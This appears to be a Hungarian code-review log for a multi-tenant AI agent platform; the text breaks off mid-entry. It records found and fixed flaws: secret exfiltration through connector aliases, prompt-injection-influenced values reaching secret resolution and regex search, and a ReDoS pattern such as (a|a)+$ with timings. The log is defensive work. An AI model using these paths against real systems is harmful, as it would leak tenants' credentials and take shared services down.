- Nyitott / követendő: a human-permission (`requiredPermissions` / `meetsMinRole`) kapu a user platform-szintű `user.role`-ját méri, nem a tenant-membership `role`-ját — külön kérdés, hogy a jogosultságot a tenant-tagsági szerephez kellene-e kötni (nem célja ennek a PR-nek). A Folyamat-spec §7.b v1-modellje egyébként `assigneeId = null`-t ír elő emberi lépésre; a kód ezen már túlmegy (konkrét assignee), ezért kellett neki a tenant-izolációt is tartania.

## 2026-07-27 - Connector Provisioning: tenant-scope-os titok-alias bizalmi határ

- Áttekintett modulok (a connector életciklus azon admin oldali része, amely külső rendszerhez való hitelesítést és agenthez rendelhető futásidejű kapcsolatot hoz létre — a korábbi napló a self-updating connector és a grant-vault részeit fedte, ezt a provisioning-belépőt nem):
  - `app/src/domain/provisioning/provisioning-service.ts` (`testConnectorDraft`, `testConnectorDraftWithCredentials`, `activateConnector`, az admin-szintű secret-injektálási és sandbox-kapu)
  - `app/src/domain/provisioning/secret-alias.ts`, `app/src/domain/connector/connector-secret-store.ts`, `app/src/domain/connector/http-api-client.ts` (alias-formátumok és a tényleges Secret Manager/env feloldás)
  - `app/src/domain/index.ts` (a valódi provisioning sandbox token-resolver bekötése), `app/src/domain/provisioning/sandbox-connection-tester.ts` (mikor kerül a token a kifelé menő read-only próbába)
  - Kontextusban: `app/src/app/actions/provisioning.ts`, `app/src/domain/provisioning/connector-config.ts`, a Provisioning Assistant feature-spec §3, §5, §7–8.
- Eredmény — ami RENDBEN volt: a connector draft nem aktív, az agent nem aktiválhat és nem rendelhet connectort, az egress sandbox deny-by-default + SSRF-őrös, az aktiválás előtt admin-review/sandbox/dual-control kapu fut, a nyers secret nem kerül auditba vagy connector-configba.
- **Lelet #1 (kritikus, biztonsági — tenant-admin titok-exfiltráció):** az `activateConnector` és a kulcsos sandbox-teszt bármilyen, feloldhatónak látszó `secretAlias`-t elfogadott: `env:WRITE_GATE_SECRET`, `secret-manager:projects/.../secrets/<bármi>`, illetve tetszőleges `secret-ref:`. A futó alkalmazás service accountja ezt feloldotta, majd az admin által konfigurált HTTP connector auth-fejlécében külső hostra küldhette. Ez a „connector beállítása” jogot a platform teljes Secret Manager-/környezeti titok-olvasási jogává emelte; egy tenant admin így potenciálisan governance-, OAuth- vagy más ügyfélhez tartozó secretet vihetett ki.
- **Lelet #2 (kritikus, bypass — sandbox út):** a credential nélküli `testConnectorDraft` is a draftban lévő, külső dokumentum/LLM által befolyásolható `secretAliasSuggested` értéket adta a sandbox token-feloldónak. Ráadásul a resolver alias hiányában globális `PROVIDER_CRM_API_KEY` fallbacket adott. Egy allowlistolt célhosttal a „csak próba” gomb ugyanazt a titok-kiszivárogtatást tette volna lehetővé, aktiválás nélkül.
- Javítás:
  - Új, fail-closed tenant-policy: `CONNECTOR_TRUSTED_SECRET_ALIASES` JSON, tenant-ID → PONTOS aliaslista; `__platform__` külön scope és nem öröklődik tenantokra. Hibás/hiányzó konfiguráció = nincs külső alias. Példa: `{"tenant-uuid":["env:CUSTOMER_CRM_KEY"]}`.
  - A connector saját, Secret Store-ba a platform által írt `secret-ref:<connectorId>` referenciája engedett; más connector `secret-ref`-je nem. Külső `env:` / Secret Manager alias csak a pontos tenant allowlistből használható.
  - Ugyanaz a közös policy-helper védi az aktiválást, a megadott credentiales sandbox-tesztet ÉS a draft-alias sandbox-utóutat. A draftból jövő nem engedélyezett aliasnál a próba token nélkül fut; a globális `PROVIDER_CRM_API_KEY` fallback megszűnt.
  - Új determinisztikus policy-teszt és CI-bekötés; a meglévő provisioning tesztben regresszió igazolja, hogy sem az aktiválás, sem a teszt-endpoint, sem a draft sandbox nem old fel `env:WRITE_GATE_SECRET`-et.
- Üzleti hatás: egy connector-adminnak csak a saját külső rendszerének kulcsát szabad kezelnie, nem a platform futtatási identitásának teljes titoktárát. A javítás megakadályozza, hogy egy rosszindulatú vagy kompromittált tenant-admin egy „CRM kapcsolat tesztelése” művelettel governance titkot vagy más ügyfél credentialjét küldje ki. A platform-üzemeltető továbbra is felvehet szükséges, tenant-specifikus, előre ismert külső aliasokat; minden más connector-kulcs a connector saját menedzselt storage-ába kerül.
- Ellenőrzés: `node --import tsx scripts/connector-secret-alias-policy.test.ts` (4/4 zöld), `node --import tsx scripts/provisioning-assistant.test.ts` (a teljes provisioning suite zöld, benne a 2 új bypass-regresszió), `npx tsc --noEmit`, célzott `npx eslint`, `git diff --check` zöld. A `tsx` CLI a sandbox IPC-korlátja miatt nem indítható, ezért az ekvivalens Node `--import tsx` futtató ment.
- Kód-review: Standards — nincs hard violation; egy jelzett alias-policy duplikáció közös `approvedConnectorSecretAlias` helperrel megszűnt. Spec — nincs eltérés a Provisioning Assistant §3/§5/§7/§8 követelményeitől.
- Üzemeltetési teendő: deploy előtt az eddig kézzel Secret Managerre/env-re mutató, tenant connector aliasokat pontos tenant-scope-pal fel kell venni a `CONNECTOR_TRUSTED_SECRET_ALIASES` konfigurációba, vagy a kulcsot az aktiváláskor kell megadni, hogy connector-owned `secret-ref` legyen.

## 2026-07-26 - Agent REST API: interakciós ticket tenant-bélyegzése (POST /api/v1/agent/tickets)

- Áttekintett modulok (az agent-kulccsal hitelesített, gép-gép REST felület — eddig a naplóban a mögöttes szolgáltatások szerepeltek, de maga a HTTP-belépő réteg nem):
  - `app/src/app/api/v1/agent/tickets/route.ts` (interakciós ticket létrehozása agent API-kulccsal), `app/src/app/api/v1/agent/tickets/[id]/route.ts` (olvasás), `app/src/app/api/v1/agent/tools/route.ts` (tool-invoke), `app/src/app/api/v1/agents/suitable/route.ts`, `app/src/app/api/v1/active-runs/route.ts`
  - `app/src/auth/agent-api-key.ts` (Bearer → agent + scope), `app/src/lib/agent-work-tenant-gate.ts` (tenant-életciklus kapu)
  - Kontextusban átnézve: `src/app/actions/platform.ts` `listTickets` (a tenant tábla forrása), a többi ticket-létrehozó út (`monitor-service`, `tool-broker-delegation`, `training-service`) a helyes tenantId-mintáért.
- Eredmény — ami RENDBEN van: a scope-kapu (`requireAgentScope`) és az agent-önazonosság minden végponton jelen van; a `[id]` GET csak a SAJÁT agent ticketjét adja vissza; a `tools` végpont már hívja a tenant-életciklus kaput és nem fogad el kliens-oldali `actingUserId`-t; a `suitable` és `active-runs` szigorúan az aktív tenantra szűr.
- **Lelet #1 (kritikus, funkcionális — az interakció NÉMÁN elveszett):** a `POST /api/v1/agent/tickets` úgy hozta létre az interakciós ticketet, hogy **egyáltalán nem állított be `tenantId`-t** → a sor `tenantId = null`-lal jött létre. A tenant táblája (`listTickets`) viszont KIZÁRÓLAG `tenantId`-re szűr, ezért ezt a ticketet SOHA, egyetlen tenant felületén sem látta ember. Vagyis amikor egy agent emberi választ/jóváhagyást kért ezen a hivatalos API-n (`awaiting_human` állapotba állítva), a kérés csendben a semmibe hullott. Ugyanaz a „kész-nek látszik, de élesben halott" osztály, mint a Telegram-webhook (#112) és a beszélgetés-megőrzés (#117).
- **Lelet #2 (közepes, biztonsági/audit — cross-tenant attribúció):** a `createdById` a `systemUserId()`-ből jött, ami a `prisma.user.findFirst({ role: 'admin', orderBy: createdAt asc })` — vagyis a **globálisan legrégebbi admin az ÖSSZES tenant közül**, függetlenül attól, melyik tenanthoz tartozik az agent. Így egy B-tenant agentjének ticketje „A-tenant adminja hozta létre" attribúcióval került az audit-nyomba.
- **Lelet #3 (közepes, életciklus — a #7.3 kapu hiánya):** a `tools` végponttal ellentétben a `tickets` POST-ban NEM futott a tenant-életciklus kapu, így egy felfüggesztett/offboardolt/archivált tenant agentje továbbra is hozhatott létre ticketet (a 2026-07-20 lelet ugyanezen osztálya, más belépőponton).
- Javítás:
  - `tenantId: agent.tenantId` bélyegzés a ticketre (a munka tulajdonosa az agent tenantja) — enélkül láthatatlan.
  - A létrehozó feloldása fail-closed módon az agent SAJÁT tenantjában: elsőként aktív admin, tartalékként a tenant bármely aktív tagja; **globális rendszer-admin CSAK a platform-szintű (tenant nélküli) agentnél**. Tag nélküli tenant esetén inkább hiba, mint idegen admin.
  - `assertAgentWorkTenantOperable(...)` kapu bevezetése (paritás a `tools` úttal): nem-`active` tenant → 403.
  - A logika kiemelve tesztelhető modulba (`app/src/lib/agent-interaction-ticket.ts`), a vékony route-adapter mögül — ugyanaz a minta, mint a webhook `public-routes.ts`-nél. Új teszt: `app/scripts/agent-interaction-ticket.test.ts` (T-1..T-7), bekötve a `package.json`-ba ÉS a `ci.yml`-be.
- Üzleti hatás: az agent-API a partnerek/automaták elsődleges gép-gép felülete. Enélkül a javítás nélkül az agent minden „kérdezz vissza egy embertől" lépése a hivatalos API-n keresztül elakadt volna — a folyamat úgy nézne ki, mintha dolgozna, valójában senki nem kapja meg a kérdést. A #2 az audit-nyom megbízhatóságát rontotta (idegen tenant neve alatt), a #3 pedig kiskaput hagyott a felfüggesztett tenant automatizálásán.
- Utólagos review a PR-en (2026-07-26, merge előtt) — két apró, de valós rés a fenti javításban, javítva:
  - **#4 (alacsony, audit):** a platform-ági `findGlobalAdmin` — a tenant-ági lekérdezéssel ellentétben — **nem szűrt `status: 'active'`-ra**, így egy felfüggesztett vagy még aktiválatlan admin neve alatt keletkezhetett volna ticket. Üzletileg: az audit-nyom olyan emberre mutatna, akinek már nincs is hozzáférése a rendszerhez. Javítva: `where: { role: 'admin', status: 'active' }` — egységes elvárás a két ág között.
  - **#5 (alacsony, integrátori DX):** a „tenantnak nincs aktív tagja" hiba magyar szövegként került volna ki a **gép-gép REST API** válaszába, miközben a route minden más hibája angol (`Unauthorized`, `Agent not found`, `Tenant is not operable`). Üzletileg: a partner-integrátor hibakezelése és logja vegyes nyelvű üzeneteket kapna. Javítva: `Tenant has no active member to attribute the ticket to`; a T-5 teszt is erre illeszkedik.
- Második review-kör a PR-en (2026-07-26, merge előtt) — egy valós jogosultsági rés a fenti javítás tartalék-ágában, javítva:
  - **#6 (közepes, jogosultság):** a „tenant bármely aktív tagja" tartalék a legrégebbi tagságot választotta, szerep nélkül. A `createdById` viszont **nem csak audit-mező**: a `ticket-service` `creator_or_operator` átmenet-szabálya (`actorMatchesRule`) a létrehozónak **állapotváltási jogot is ad** a ticketen. Így egy admin nélküli tenantban egy **viewer** válhatott volna a létrehozóvá, és ezzel operátori jogot kapott volna az agent interakciós ticketjének mozgatására — miközben a felületen egyébként csak olvasásra jogosult. Üzletileg: a „csak megnézheti" jogosultsági szint csendben átfordult volna „el is intézheti"-be épp azon a ponton, ahol az agent emberi döntést kér. Javítva: a létrehozó feloldása kötött rangsorban megy (`TICKET_CREATOR_ROLE_PRECEDENCE`: admin → approver → operator → viewer), viewer csak akkor kerül sorra, ha nála magasabb rangú aktív tag nincs. A rangsor a lib-modulban, explicit listaként él (nem DB-oldali enum-rendezésre bízva), így tesztelhető: új **T-8** teszt (operator jelenlétében sosem viewer + a rangsor-lista rögzítése).
- Ellenőrzés: `npx tsx scripts/agent-interaction-ticket.test.ts` — 7/7 zöld; `npx tsc --noEmit` — teljes fa zöld; `eslint` az érintett fájlokra zöld. A gate a `resolveWorkOwnerTenantId(null, agent.tenantId)` révén helyesen az agent tenantjára kulcsol — ugyanarra az értékre, amit a ticketre bélyegzünk.
- Nyitott / követendő (nem-cél ebben a PR-ben): a platform-szintű (tenant nélküli) agent interakciós ticketjének nincs tenant-boardja — ez a null-tenant sor eleve sehol sem jelenik meg (pre-existing korlát, összhangban a `tool-broker-delegation`-nal); az „any active member" tartalék tenant-határt tart, de audit-pontosságban egy tetszőleges tag nevét adja — hosszabb távon tenant-szintű szintetikus rendszer-user lenne a tiszta megoldás.

## 2026-07-25 - Bejövő Telegram-csatorna webhook: bizalmi határ (auth-gate + pre-auth titok-feloldás)

- Áttekintett modulok (a bejövő webhook TELJES külső támadási felülete — ez volt az egyetlen, még nem naplózott, külső, nem-megbízható bemenetet fogadó belépő):
  - `app/src/app/api/channels/telegram/webhook/route.ts` (a publikus HTTP-belépő: message + callback_query kivonat)
  - `app/src/middleware.ts` (Clerk auth-gate / public-route allowlist)
  - `app/src/domain/channel/channel-linking-service.ts` (bejövő frissítés: fejléc-vetés, összekötés, bekötetlen semleges válasz, forduló-sorba írás)
  - `app/src/domain/channel/channel-approval-service.ts` (jóváhagyó-gomb callback: aláírás, címzett-kötés, élő jogosultság, SoD, atomi egyszer-használat)
  - `app/src/domain/channel/channel-link-token.ts`, `channel-identity-crypto.ts` (deep-link token aláírás + AES-GCM/HMAC identitás-kripto)
  - `app/src/domain/channel/channel-outbound-transport.ts` (kimenő egress-őr, deny-by-default a Telegram hostra)
  - Kontextusban átnézve, külön leletet nem adott: `channel-bot-service.ts` (titok-referencia validáció, nyers titok sosem a nézetben), `channel-turn-service.ts` (fail-closed hozzáférés-kapu, dead-letter), `crypto/timing-safe.ts`, `crypto/secret-resolver.ts`, `connector/connector-secret-store.ts`.
- Eredmény — ami RENDBEN van (nem a nulláról védtelen):
  - A titkos fejléc vetése KONSTANS IDEJŰ és fail-closed (`safeSecretEquals`: üres/hiányzó várt titok → `false`, nincs bypass). A deep-link token rövid TTL + egyszer-használat + `consumedByLookupHash`-kötés. A jóváhagyó-callback autorizációja alapos: aláírás a kötött mezők felett, címzett-kötés, identitás aktív+tenant-egyezés, ÉLŐ jogosultság-újraellenőrzés, SoD (saját-kérés jóváhagyás tiltva), atomi consume + a KÖZÖS állapotgép policy-kapuja. Az egress deny-by-default. A nyers titkok sosem kerülnek auditba/naplóba (álnevesített id).
- **Lelet #1 (kritikus, funkcionális — a feature élesben NÉMÁN HALOTT):** a webhook útvonala `/api/channels/telegram/webhook`, de a middleware `isPublicRoute` allowlistje csak `/api/webhooks(.*)`-t tartalmazott — a `/api/channels/...`-t NEM. Prod-ban (Clerk bekapcsolva) így `auth.protect()` fut rá, és a Clerk-munkamenet NÉLKÜLI Telegram-POST-okat elutasítja, MIELŐTT a handlerhez érnének. Következmény: a teljes bejövő csatorna (user-üzenetek) ÉS a Telegram-alapú jóváhagyás (governance-döntések) sosem fut le élesben; a Telegram néhány újraküldés után letiltja a webhookot. Azért csúszott át, mert a route szándékosan „vékony adapter, nincs külön tesztje", a service-tesztek pedig nem a HTTP/middleware rétegen át hajtanak.
- **Lelet #2 (közepes, biztonsági/skálázhatóság — DoS/költség-amplifikáció):** a bejövő webhook mindkét belépője (linking + approval) minden kérésnél újra-feloldja a bot webhook-titkát (`resolveConnectorApiKey`), ami élesben (Secret Manager backend) egy HTTPS-körforduló CACHE NÉLKÜL — és ez a KONSTANS IDEJŰ összehasonlítás ELŐTT, a publikus, hitelesítés-ELŐTTI úton történik. Egy hamis-kérés-özön így kérésenként egy Secret Manager-hívást + egy DB-lekérdezést vált ki: költség-amplifikáció, a projekt SM-kvótájának kimerítése (429), és ezen keresztül ÖN-DoS a platform ÖSSZES connector-titok-feloldására. Ugyanaz az osztály, mint a korábban naplózott agent-API-kulcs O(n) bcrypt-DoS: drága művelet a pre-auth úton.
- Javítás:
  - `middleware.ts`: az `isPublicRoute` allowlist kiegészítve a `'/api/channels/(.*)/webhook'` és `'/api/channels/(.*)/webhook/(.*)'` mintákkal — SZŰKEN csak a csatorna-webhook végpontra és alútjaira (a saját, konstans idejű megosztott-titok fejlécük hitelesít), a többi `/api/channels` admin-útvonal (és egy jövőbeli `.../webhook-admin`) Clerk-védett marad. A trailing `(.*)` szándékosan KIMARADT (a /code-review mindkét ága jelezte, hogy az véletlenül publikussá tenné a `webhook`-előtagú testvér-route-okat).
  - `lib/crypto/ttl-secret-cache.ts` (ÚJ): rövid TTL-es (alap 60 mp, `CHANNEL_WEBHOOK_SECRET_TTL_MS`) in-memory titok-cache; CSAK a sikert cache-eli (a hibát sosem → fail-closed marad), az egyidejű miss-eket megosztja (nincs thundering herd). `domain/index.ts`: EGYETLEN megosztott cache-példány fedi mindkét belépőt (linking + approval), a konstans idejű vetés és a fail-closed viselkedés változatlan.
- Üzleti hatás:
  - #1 nélkül a Telegram-csatorna és a mobil jóváhagyás élesben egyszerűen NEM MŰKÖDIK — egy jóváhagyásra váró governed action sosem kapná meg a döntést Telegramon, a folyamat csendben elakadna. Egysoros, jól körülhatárolt middleware-javítás oldja fel, a biztonsági modell gyengítése nélkül (a route továbbra is a saját titkával hitelesít).
  - #2 a „menjünk élesbe enterprise platformként" küszöb valódi költség/rendelkezésre-állási kockázata: egy publikus végpont, aminek minden hamis kérése pénzbe kerül és a közös titok-infrastruktúrát terheli. A cache a forró utat egy SM-körfordulóra szűkíti időablakonként.
- Ellenőrzés:
  - `npm run test:ttl-secret-cache` — 5/5 zöld (TTL-hit, TTL-lejárat/rotáció, kulcs-szeparáció, párhuzamos miss-megosztás, hiba-nem-cache-elés).
  - `npm run test:channel-linking` és `test:channel-approval` — zöld (a titok-feloldó port cseréje nem tört varratot).
  - `npx tsc --noEmit` — az érintett fájlokra nincs hiba.
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - A webhook-útnak nincs saját rate-limitje; a titok-cache a fő költséget levágja, de egy tényleges volumetrikus DoS ellen (a fejléc-vetés + DB-lookup önmagában is CPU/kapcsolat) hálózati/edge rate-limit lenne a teljes védelem.
  - A duplikáció-vízjel a tartós forduló-sorba írás ELŐTT lép; egy pontosan időzített crash a vízjel-billentés és az enqueue között elveszíthet egy bekötött üzenetet (Telegram-újraküldés ekkor „duplikátumként" eldobná). Alacsony valószínűség, de a #73 tartóssági ígéretét gyengíti — atomizálás külön feladat.

### 2026-07-25 (második kör) - A javítás felülvizsgálata merge előtt

- Áttekintve a fenti javítás TELJES diffje (`main...review/telegram-webhook-trust-boundary`): `middleware.ts`, `lib/crypto/ttl-secret-cache.ts`, `domain/index.ts` wiring, `scripts/ttl-secret-cache.test.ts`.
- Megerősítve (nem csak kódolvasással):
  - A `'/api/channels/(.*)/webhook'` minta a Clerk SAJÁT `createRouteMatcher`-ével kiértékelve tényleg illeszkedik a `/api/channels/telegram/webhook`-ra, és tényleg NEM illeszkedik a `webhook-admin` / `config` / csupasz `/api/channels/telegram` utakra — vagyis a szűkítő szándék valóban teljesül (a Clerk 7 mid-path `(.*)` csoportot még támogat).
  - A titok-cache fail-closed marad: `webhookSecretRef` a sémában `String` (nem nullable), a hiba nem cache-elődik, a párhuzamos miss-ek osztoznak.
- **Lelet #3 (közepes, folyamat — a javítás nem volt őrizve):** a PR HÁROM tesztje közül EGYIK sem futott volna a CI-ban — a `test:ttl-secret-cache` bekerült a `package.json`-ba, de a `ci.yml`-be nem; a `test:channel-approval` pedig már korábban is kimaradt (a jóváhagyó-út varrat-tesztje évek óta csak lokálisan futott). Egy zöld CI így hamis biztonságot adott volna.
- **Lelet #4 (magas, folyamat — a P0 megismételhető):** a #1 lelet (némán halott csatorna) az az osztály, ami se tesztben, se kódolvasáskor nem látszik, csak élesben, elveszett üzenetek formájában — és a javítás után SEMMI nem akadályozta meg, hogy egy következő route ugyanígy kimaradjon vagy a minta véletlenül kitáguljon.
- **Lelet #5 (alacsony, üzemeltetői footgun):** a `Number(process.env.CHANNEL_WEBHOOK_SECRET_TTL_MS) || 60_000` a `0`-t némán 60 mp-re írta volna át. A `0` viszont értelmes üzemeltetői szándék („ne cache-elj, a rotáció azonnal érvényesüljön") — a kikapcsoló kapcsoló hatástalan lett volna, ráadásul némán.
- Javítás (második kör):
  - `lib/auth/public-routes.ts` (ÚJ): a publikus route-minták egyetlen, exportált forrása, a felvétel szabályával. A `middleware.ts` innen olvas. (Külön modul, mert a Next 16 a middleware/proxy fájlból EGYETLEN függvény-exportot vár — a listát a helyén hagyva nem lenne tesztelhető.)
  - `scripts/public-routes.test.ts` (ÚJ, 6 teszt): a Clerk saját matcherével rögzíti, hogy minden saját hitelesítésű gépi belépő publikus, a szomszédos kezelői route-ok védettek, és az alkalmazás-felület védett marad. **Mutációval ellenőrizve:** a webhook-minta eltávolításakor a teszt pontosan a P0-forgatókönyvre bukik.
  - `ci.yml`: `test:channel-approval` + `test:ttl-secret-cache` + `test:public-routes` bekötve.
  - `domain/index.ts`: a TTL-parsz `0`-t elfogad (= nincs cache), és az ÜRES env-értéket „nincs beállítva"-ként kezeli (nem `0`-ként).
- Üzleti hatás: a #4 javítása a lényegi hozadék — nem egy hibát javít, hanem egy hibaosztályt zár le. A „publikus vagy védett ez a végpont?" kérdés eddig egy kommentelt tömbben élt, ahol a tévedés két irányba is csendes: vagy egy funkció hal meg élesben szó nélkül, vagy egy védendő végpont nyílik meg. Mostantól mindkét irányt CI-ban futó assert őrzi.
- Ellenőrzés: `npx tsc --noEmit` zöld; `eslint` az érintett fájlokra zöld; `test:public-routes` 6/6, `test:ttl-secret-cache` 5/5, `test:channel-linking` / `channel-approval` / `channel-turn` / `channel-metrics` / `channel-retention` / `channel-agent-access` mind zöld.
- Nyitott (változatlanul, nem-cél): webhook rate-limit; a vízjel-billentés és az enqueue közötti atomizálás. **Új megfigyelés:** a `middleware.ts` konvenció a Next 16-ban deprecated (`proxy.ts` a neve), a Clerk 7.5 pedig a `createRouteMatcher`-t jelöli elavultnak (erőforrás-szintű auth-ellenőrzés javasolt helyette) — mindkettő külön migrációs feladat, és a most bevezetett `public-routes.test.ts` pont az a háló, ami egy ilyen migrációt biztonságossá tesz.

## 2026-07-23 - Fájl-munkaterület eszközök: agent-vezérelt regex ReDoS (file_search / file_glob)

- Áttekintett modulok:
  - `app/src/domain/file-editor/file-editor-service.ts` (a teljes agent-facing fájl-eszköz felület: read/write/edit/list/glob/search/delete + xlsx/docx/pdf/pptx/html; path-traversal kapu, regex-alapú keresés)
  - `app/src/domain/file-editor/workspace-storage.ts` (tenant-kulcsolt tároló-réteg — korábban külön áttekintve, itt a keresési belépőpontok határaként)
  - `app/src/domain/tool-broker/handlers/file.handler.ts` és `tool-broker-types.ts` (hogyan jutnak az agent-tool argumentumok a szolgáltatásba — validáció-lánc)
  - Kontextusban átnézve, de külön leletet nem adott: `dispatcher/harness-run-env.ts`, `dispatcher/cloud-run-auth.ts`, a harness `complete`/`process` callback-útvonalak, `connector/connector-secret-store.ts`, `gateway/oauth-token-store.ts`, `gateway/chatgpt-oauth-bridge.ts`.
- Kiinduló állapot (fontos — NEM védtelen a nulláról):
  - A `file_search` / `file_glob` ReDoS-védelmét részben MÁR bevezette a nemrég mergelt **PR #102** (`7f8ce0d1 "fix(file-editor): block ReDoS in agent-driven file_search patterns"`, 2026-07-21). Ez létrehozta a `safe-pattern.ts`-t, a bemeneti korlátokat (minta-/sor-/fájlszám-plafon) és a tipizált hibákat. A `code_review.md` naplóban viszont NEM szerepelt — ezért került most átfogó, célzott felülvizsgálat alá.
  - A meglévő kapu (`hasNestedUnboundedQuantifier`) KIZÁRÓLAG a beágyazott, nem-korlátos kvantort (`(a+)+`, star height ≥ 2) fogta.
- Eredmény:
  - A fájl-eszközök tenant-izolációja és path-traversal védelme rendben: a `resolveSafePath` elutasítja a `..` szegmenseket, a tároló tenant+ticket kulccsal particionál, a broker-handler a munka tenantjára old fel. A törlés-megerősítés és a deliverable-védelmek megvannak. A PR #102 bemeneti korlátai és tipizált hibái is helyükön.
  - **Maradék kritikus rés (CWE-1333, ReDoS-bypass):** az exponenciális visszalépésnek KÉT gyakorlati családja van, a meglévő kapu csak az egyiket zárta. A beágyazott kvantor (`(a+)+`) MELLETT az ismételt, átfedő alternáció (`(a|a)+`, `(a|ab)+`) is 2^n — ez star height 1, ezért a régi `hasNestedUnboundedQuantifier` ÁTENGEDTE, egyenesen a `new RegExp`-be. A bemeneti korlátok itt NEM segítenek: az alternáció-átfedés már ~30 karakteren berobban, jóval a sor-hossz plafon (20000) alatt.
  - **Empirikusan mérve** a régi úton: a `(a|a)+$` minta 24 karakteren 2,2 s, 30-on 12 s, **32-on ~51 s** (kétszereződés 2 karakterenként) — egy ~40 karakteres input több perces teljes befagyást okoz. Az argumentumok az LLM tool-hívásából jönnek, amit részben megbízhatatlan ticket-/dokumentumtartalom (prompt-injection) befolyásolhat; a worker EGYSZÁLÚ és több tenant futásait szolgálja ki, tehát a befagyás cross-tenant DoS.
  - A rést a `/code-review` MINDKÉT ága (Standards és Spec) egymástól függetlenül, konkrét trace-szel feltárta — ez adta a megerősítést, hogy nem elméleti.
- Javítás (a meglévő kapu KITERJESZTÉSE, nem újraírása):
  - `safe-pattern.ts`: a `hasNestedUnboundedQuantifier` helyére `hasCatastrophicQuantifier` lép, ami a paren-stack bejárás közben csoportonként azt is számon tartja, hogy a csoport tartalmaz-e top-level alternációt (`|`), és tiltja a nem-korlátos kvantort egy ILYEN csoporton is. Így most MINDKÉT exponenciális családot zárja.
  - A parser char-class kezelése javítva: az escapelt `\]`-t a karakterosztályon belül helyesen kezeli (a régi `indexOf(']')` idő előtt lezárta volna).
  - Duplikáció megszüntetve: kiemelt `assertPatternLength` + `compileRegex` helper, amit a `buildUserRegex` és a `globToRegex` is használ (a Standards-ág jelezte a `globToRegex`↔`safe-pattern` duplikációt).
  - `scripts/file-search-safe-pattern.test.ts` bővítve 13→19 esetre: az alternáció-átfedéses család (`(a|a)+`, `(a|ab)+`, `(?:x|x)*`, `((a|a)+)+`) most tiltott; a jogos minták (`a+`, `[a-z]+`, `(abc)+`, `a{2,5}`, `foo.*bar`, `foo|bar` kvantor nélkül, `*.txt` glob, escapelt `\]`) átmennek; időzített eset bizonyítja, hogy a katasztrofális minta most < 500 ms alatt (a futtatás ELŐTT) bukik.
- Üzleti hatás:
  - A ReDoS-védelmet PR #102 elkezdte, de egy fél lyukat hagyott: az alternáció-átfedéses minta (`(a|a)+`) továbbra is percekre megbéníthatta a feldolgozó workert — és vele MÁS ügyfelek futásait is, mert a worker közös és egyszálú. Ez pont az a fajta „majdnem kész" biztonsági javítás, ami hamis biztonságérzetet ad: a nyilvánvaló mintát fogja, a majdnem-ugyanolyat nem. A mostani PR bezárja a második exponenciális családot is, így a védelem teljes a két gyakorlati DoS-vektorra.
  - A tipizált hibaüzenet a közérthető-UI alapelvet is szolgálja: az agent (és a naplót néző ember) azt látja, „a minta veszélyes, egyszerűsítsd", nem egy néma időtúllépést.
- Tudott, dokumentált korlát (nem-cél ebben a PR-ben):
  - A kvantorozott alternációt AKKOR is tiltjuk, ha az ágak nem fednek át (`(foo|bar)+`) — konzervatív hamis pozitív. A fájl-keresésnél ez elfogadható ár a biztos védelemért; a pontos átfedés-analízis külön feladat.
  - A magas fokú, tisztán polinomiális minták (sok interleaved `.*…a`) nincsenek statikusan tiltva; ellenük a sor-hossz plafon véd. A teljes körű megoldás (linear-idejű RE2 motor, vagy a match futtatása worker-threadben wall-clock időzárral) külön, nagyobb feladat — a jelen PR a két gyakorlati, exponenciális családot zárja le.
- Ellenőrzés:
  - `npx tsx scripts/file-search-safe-pattern.test.ts` — 19/19 zöld.
  - `npx tsc --noEmit` — az érintett fájlokra nincs hiba.
  - Regresszió: `scripts/xlsx-range-and-delete-confirm.test.ts` zöld (a fájl-eszköz réteg többi része érintetlen).
  - Empirikus ReDoS-mérés a régi úton: `(a|a)+$` 32 karakteren ~51 s → a javított úton azonnal `UNSAFE_PATTERN`.

## 2026-07-20 - Platform control plane: tenant-életciklus betartatása az automata úton

- Áttekintett modulok:
  - `app/src/domain/tenant/tenant-service.ts` (tenant-életciklus, membership CRUD, platform-szerep grant/revoke, assume-audit)
  - `app/src/app/actions/tenant.ts` (a control plane teljes server-action felülete: switch/assume, lifecycle, platform IAM, tenant-membership)
  - `app/src/auth/context.ts` + `app/src/auth/tenant-context.ts` (aktív-tenant feloldás, superadmin assume, `requireTenantRole` / `requireTenantPermission` / `requirePlatformRole` guardok)
  - `app/src/lib/tenant-policy.ts` (tiszta döntési logika: státusz-kapuk, switch-döntés, utolsó-admin lock)
  - `app/src/domain/platform-settings/platform-settings-service.ts` (kill-switchek, model-policy, egress-allowlist, DB-mód — auditálási lefedettség)
  - `app/src/domain/dispatcher/dispatcher-service.ts` és `app/src/auth/agent-api-key.ts` (az automata dispatch-út kapui)
- Eredmény:
  - A jogosultsági kapuk és az audit-lefedettség a control plane emberi felületén rendben van: minden lifecycle- és platform-IAM-action mögött ott a `requirePlatformRole`, a superadmin assume auditált, az „utolsó aktív tenant-admin" és az „utolsó superadmin" lockout-védelem is jelen van. A `PlatformSettingsService` minden állító metódusa auditál.
  - **Kritikus életciklus-rés:** a `tenantStatusAllowsOperations` kapu (Feature-spec §7.3 — „suspended tenantban nincs run") kizárólag az EMBERI guardokban élt. A dispatcher `dispatchReadyTicket` kapusora `no_agent` → `process_terminal` → agent-státusz → budget, tenant-státusz sehol. Ugyanígy az `authenticateAgentRequest` is csak agentId+scope-ot old fel. Következmény: egy felfüggesztett, offboardolt vagy archivált tenantban az emberek kizáródnak, de az agentek tovább futnak — modell-keretet égetnek, connectorokat hívnak, adatot mozgatnak és egress-elnek. Pont az a kontroll nem működött, amiért a felfüggesztés létezik (nemfizetés, szerződésbontás, biztonsági incidens elszigetelése).
  - **Fail-open a státusz-kapuban:** a `requireTenantRoleFromContext` és a `requireTenantPermission` `if (tenant && !tenantStatusAllowsOperations(...))` alakja miatt a fel nem oldható tenant-azonosító ÁTENGEDTE a kaput — a bizonytalanság engedélyre fordult.
  - **Auditálatlan jogosultság-adás:** a `TenantService.grantPlatformRole` `actorId`-ja opcionális volt, és hiánya esetén a service csendben, audit-sor nélkül adott platform-szerepet (akár superadmint). A mai hívók mind átadják, tehát élesben nem szivárgott — de a legmagasabb tétű aktus audit-kötelezettsége hívói fegyelemre volt bízva, nem a típusra.
- Javítás:
